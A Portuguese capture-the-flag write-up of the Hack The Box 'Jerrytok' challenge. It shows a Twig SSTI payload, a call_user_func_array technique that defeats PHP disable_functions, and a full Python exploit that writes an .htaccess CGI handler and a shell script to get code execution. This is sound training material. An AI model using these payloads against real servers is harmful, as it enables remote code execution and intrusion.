---
description: >-
  obs: Em algumas evidências o IP fica diferente, pois a instância tem limite
  para ficar online e preciso iniciar outra
---

# Jerrytok

Jerrytok é um desafio médio do hack the box da categoria web.

O desafio disponibiliza o código-fonte e um ambiente Docker para subir a aplicação, permitindo que eu inicie os testes em um ambiente local.



## Recon

Começo explorando a aplicação interagindo com a interface e analisando suas funcionalidades. Em seguida, examino o código-fonte para entender melhor sua implementação.

A primeira coisa que faço é subir a aplicação através do container docker para poder interagir com ela no navegador:<br>

{{< figure src="/assets/image.png" >}}

A aplicação está disponível em `localhost:1337`, permitindo que eu a analise diretamente no navegador.

{{< figure src="/assets/image (1).png" >}}

É uma página aparentemente estática, não existe nenhuma funcionalidade na interface que podemos interagir, então vou olhar o código fonte para ver se existe algo interessante nessa aplicação.

Trata-se de uma aplicação PHP baseada no framework Symfony. Ao verificar o arquivo de rotas, vejo que há apenas uma rota definida, direcionando para `DefaultController::index()`.

{{< figure src="/assets/image (3).png" >}}

Lendo a função dessa `controller` que processa nossa requisição HTTP, podemos notar algo interessante, essa rota aceita uma `query string` chamada `location`, em seguida a aplicação gera uma `template string` com esse parâmetro, dessa forma podemos controlar a template string que depois será renderizada como um template `twig`, assim temos uma vulnerabilidade de `SSTI` nesse sistema:

{{< figure src="/assets/image (4).png" >}}

## Exploração

Para confirmar a vulnerabilidade SSTI, envio um teste padrão `{{7*7}}` na query string e verifico a resposta.

{{< figure src="/assets/image (6).png" >}}

Com isso temos a confirmação do `SSTI` que podemos abusar. Para ler a flag precisamos explorar esse `SSTI` para conseguir um `RCE` e executar um programa `readflag` (um file\_get\_contents não funcionaria, pois a flag está no diretório root onde o PHP não tem acesso) como objetivo do desafio:

{{< figure src="/assets/image (8).png" >}}

{{< figure src="/assets/image (9).png" >}}

Com isso, basta usar o SSTI para executar um comando no SO que execute o programa readflag, usando a payload `{{['/readflag']|filter('system')}}`:

{{< figure src="/assets/image (10).png" >}}

Porém, ao executar essa payload no ambiente de produção, ela não funciona:

{{< figure src="/assets/image (11).png" >}}

### Funções não desabilitadas

Estudando mais o código fonte, vejo que o motivo está nas configurações de `disable funcions` do PHP, que não permite que eu execute a função `system` e várias outras:

{{< figure src="/assets/image (12).png" >}}

```bash
echo "disable_functions = exec, system, popen, proc_open, shell_exec, passthru, ini_set, putenv, pfsockopen, fsockopen, socket_create, mail" >> /etc/php82/conf.d/disablefns.ini
```



Agora, minha intenção é encontrar formas de contornar o `disable_functions`. A primeira abordagem que considero é identificar alguma função ainda disponível que permita a execução de comandos no sistema operacional, porém não consegui achar funções perigosas fora dessa lista.

{% hint style="info" %}
Obs: Depois de resolver o desafio, ao ler outras writeups,  descobri o que a função `imap` pode ser explorada para conseguir um RCE.
{% endhint %}

### LD\_Preload

Pesquisando mais, encontro uma técnica para obter RCE via `LD_PRELOAD` no Linux. No entanto, ela requer a função `putenv`, que está bloqueada. Apesar disso, considero essa abordagem útil para testes futuros.: [https://blog.ironlinux.com.br/bypass-do-disable-functions-do-php-utilizando-ld\_preload/](https://blog.ironlinux.com.br/bypass-do-disable-functions-do-php-utilizando-ld_preload/).

### Overwrite disable\_functions

#### PHP INFO

Com o SSTI em mãos, eu consigo executar qualquer função bloqueada do PHP, o que expande minhas possibilidades, então eu invisto um tempo craftando uma payload onde eu consiga executar qualquer função independente do número de parâmetros que ela precise, depois de certo tempo de estudo e pesquisa consigo usar a função `call_user_func_array` para buildar uma função com seus parâmetros para mim, a payload final fica com esse padrão: `{{[‘function_name’, [‘param1’, ‘param2’, ...]]|sort(‘call_user_func_array’)|join}}`. Dessa forma agora, eu tenho controle sobre qualquer função do PHP e muito mais possibilidades para explorar esse ambiente.&#x20;

Para confirmar o funcionamento e ter uma discrição melhor do ambiente, escrevo um arquivo com `phpinfo();` que vai me dizer as configurações do ambiente utilizando essa payload: `{{ ['file_put_contents', ['/www/public/info2.php', '']] | sort('call_user_func_array') | join }}`

{{< figure src="/assets/image (13).png" >}}

Isso me da uma visão muito mais privilegiada da configuração do ambiente, e consigo observar as mudanças causadas pelas minhas tentativas de modificar os arquivos de configuração com `file_put_contents`.&#x20;

#### .user.ini

Além de `disable_functions`, a configuração `open_basedir` está definida para `/www`, restringindo o acesso do PHP a arquivos dentro desse diretório, tanto para leitura quanto para escrita.

Fazendo algumas pesquisar conheci o arquivo `.user.ini` do PHP que permite setar algumas configurações do PHP, com isso duas possibilidades aparecem em mente:

* Sobrescrever a configuração de disable\_functions;
* Sobrescrever a configuração de open\_basedir, e alterar as configurações do php.ini no diretório `/etc;`&#x20;

A primeira opção parece mais direto ao ponto, então vamos testar primeiro.

Uso a payload `{{ ['file_put_contents', ['/www/public/.user.ini', 'disable_functions = "shell_exec"']] | sort('call_user_func_array') | join }}` que irá escrever no `.user.ini` (e criar o arquivo se não existir) que a única função desabilitada é o `shell_exec`, e irá liberar todas as outras.&#x20;

{{< figure src="/assets/image (14).png" >}}

Agora, olhando no arquivo info.php que criamos anteriormente, podemos conferir se conseguimos modificar a configuração, e concluímos que não, as funções continuam bloqueadas:

{{< figure src="/assets/image (15).png" >}}

O `.user.ini` não pode alterar `disable_functions` nem `open_basedir`, descartando essa abordagem.

#### Htaccess

Seguindo essa mesma linha, existe um outro arquivo que pode alterar as configurações do PHP em que podemos tentar abusar, que é o arquivo `.htaccess`.

No ambiente, o servidor Apache recebe as requisições e, seguindo regras específicas (algumas definidas no `.htaccess`), direciona a execução para os arquivos PHP. Isso permite que o `.htaccess` modifique alguns comportamentos do PHP.

Vou tentar a mesma estratégia anterior de sobrescrever algumas diretivas de configuração, porém através do `.HTACESS`.&#x20;

Faço o teste no container local, porém obtenho um erro:&#x20;

```bash
[Mon Mar 03 20:26:13.050064 2025] [core:alert] [pid 97:tid 109] [client 172.17.0.1:56906] /www/public/.htaccess: Invalid command 'php_value', perhaps misspelled or defined by a module not included in the server configuration, referer: http://localhost:1337/info.php
```

O `.htaccess` não pode alterar o valor de `disable_functions`, essa ideia também não irá funcionar.



### Mod CGI

Até então as ideias não funcionaram, mas os testes nos deram evidências importantes para o nosso contexto atual:

* Apesar do `disable_functions`, podemos controlar diversas funções do PHP e conseguir um `Arbitrary Read/Write` dentro do diretório `/www`;
* O ambiente é controlado por um servidor Apache que controla as chamadas para o PHP;
* Podemos escrever arquivos dentro de `/www` que sejam interpretados pelo Apache.

Indo na mesma linha do `.htaccess`, podemos criar uma configuração com o apache para executar scripts diretamente como CGI baseado nessa pesquisa: [https://hacktricks.boitatech.com.br/pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable\_functions-open\_basedir-bypass/disable\_functions-bypass-mod\_cgi](https://hacktricks.boitatech.com.br/pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-mod_cgi)

Em resumo, vamos criar um script com uma extensão qualquer (.dizzle) que em seu conteúdo tenham instruções (um shell script) para serem executadas. Em seguida, vamos configurar o apache para interpretar arquivos .dizzle como um arquivo a ser processado diretamente pelo CGI, sem ser executado pelo PHP e todas as suas restrições nesse ambiente. No final, criaremos um HTML qualquer que chamará pelo nosso arquivo.dizzle, e no momento que o browser fizer a requisição para esse arquivo para o apache, ele será executado e nosso RCE deverá funcionar.

Primeiro, crio o script que o CGI deverá executar, para o desafio, preciso executar o o comando `readflag` e ler o output, farei com esse script:

```bash
#!/bin/sh
#sh pois o sistema não tem o bash instalado
echo -ne "Content-Type: text/html\n\n"; # header necessário para o apache

/readflag
```

Uso esse script python para realizar a request e cuidar dos encodings para mim:

```python
import requests
import urllib.parse

bash_script ="""#!/bin/sh
echo -ne 'Content-Type: text/html\\\\n\\\\n'
/readflag
"""
twig_payload = '{{' + \
    '["file_put_contents", ' + \
        '["/www/public/cmd.dizzle", ' + \
            f'"{bash_script}"' + \
        ']' + \
    ']|sort("call_user_func_array")|join' + \
'}}'

encoded_payload = urllib.parse.quote(twig_payload)
url = f"http://localhost:1337/?location={encoded_payload}"

response = requests.get(url)
print(f"Status: {response.status_code}")
```

Executando o script no ambiente local e conferindo dentro do container, podemos ver que o arquivo foi escrito:

{{< figure src="/assets/image (19).png" >}}

Agora precisamos escrever a regra para o apache tratar o arquivo `cmd.dizzle` como um arquivo para ser interpretado pelo CGI. Uso esse conteúdo para o .htaccess:

```apacheconf
Options +ExecCGI
AddHandler cgi-script .dizzle
```

Novamente uso um script para lidar com todo o encoding:

```python
import requests
import urllib.parse

bash_script ="""
Options +ExecCGI
AddHandler cgi-script .dizzle
"""
twig_payload = '{{' + \
    '["file_put_contents", ' + \
        '["/www/public/.htaccess", ' + \
            f'"{bash_script}"' + \
        ']' + \
    ']|sort("call_user_func_array")|join' + \
'}}'

encoded_payload = urllib.parse.quote(twig_payload)
url = f"http://localhost:1337/?location={encoded_payload}"

response = requests.get(url)
print(f"Status: {response.status_code}")
```

{{< figure src="/assets/image (20).png" >}}

Temos o cmd.dizzle no servidor e o .htaccess configurado para executá-lo, porém se tentarmos, teremos um erro de permissão:



{{< figure src="/assets/image (17).png" >}}

Então vamos configurar a permissão para 777 com a payload  `{{ ['chmod', ['/www/public/cmd.dizzle', '511']] | sort('call_user_func_array') | join }}`&#x20;

E agora, acessando a rota /cmd.dizzle, tenho a flag:

{{< figure src="/assets/image (18).png" >}}

Com o exploit funcional, executo-o no servidor de produção para capturar a flag real.

Para isso, crio um script que executa o exploit que criamos agora de forma automática.

```python
import sys
import requests
import urllib.parse

def write_htaccess() -> str:
    htaccess = """Options +ExecCGI
AddHandler cgi-script .dizzle
"""
    twig_payload = '{{' + \
    '["file_put_contents", ' + \
        '["/www/public/.htaccess", ' + \
            f'"{htaccess}"' + \
        ']' + \
    ']|sort("call_user_func_array")|join' + \
    '}}'

    encoded_payload = urllib.parse.quote(twig_payload)
    return encoded_payload

def write_cmd() -> str:
    bash_script = """#!/bin/sh
echo -ne 'Content-Type: text/html\\n\\n'
/readflag
"""
    twig_payload = '{{' + \
        '["file_put_contents", ' + \
            '["/www/public/cmd.dizzle", ' + \
                f'"{bash_script}"' + \
            ']' + \
        ']|sort("call_user_func_array")|join' + \
    '}}'

    encoded_payload = urllib.parse.quote(twig_payload)
    return encoded_payload

def write_chmod() -> str:
    payload = "{{ ['chmod', ['/www/public/cmd.dizzle', '511']] | sort('call_user_func_array') | join }}"
    encoded_payload = urllib.parse.quote(payload)
    return encoded_payload

def send_request(req: requests.Session, url: str, payload: str) -> requests.Response:
    r = req.get(f"{url}{payload}")
    return r 

def main():
    if len(sys.argv) != 3:
        print("Usage: python program.py <URL> <PARAM>")
        return
    
    url = f"{sys.argv[1]}?{sys.argv[2]}="
    s = requests.Session()
    
    # 1 - Escrever cmd.dizzle
    print("Writing cmd.dizzle...")
    resp = send_request(s, url, write_cmd())
    if resp.status_code != 200:
        print(f"Error writing cmd.dizzle: {resp.status_code}")
        print(resp.text)
        return
    
    # 2 - Escrever htaccess
    print("Writing .htaccess...")
    resp = send_request(s, url, write_htaccess())
    if resp.status_code != 200:
        print(f"Error writing .htaccess: {resp.status_code}")
        print(resp.text)
        return
    
    # 3 - Alterar permissões
    print("Changing permissions...")
    resp = send_request(s, url, write_chmod())
    if resp.status_code != 200:
        print(f"Error changing permissions: {resp.status_code}")
        print(resp.text)
        return

    # 4 - Chamar cmd.dizzle
    print("Executing cmd.dizzle...")
    resp = s.get(f"{sys.argv[1]}/cmd.dizzle")
    if resp.status_code != 200:
        print(f"Error executing cmd.dizzle: {resp.status_code}")
        print(resp.text)
        return

    print("Flag obtained:")
    print(resp.text)

if __name__ == "__main__":
    main()

```

Primeiro eu testo no container local para saber se funcionou como deveria, e com tudo certo, executo no servidor de produção para conseguir a flag:

{{< figure src="/assets/image (21).png" >}}
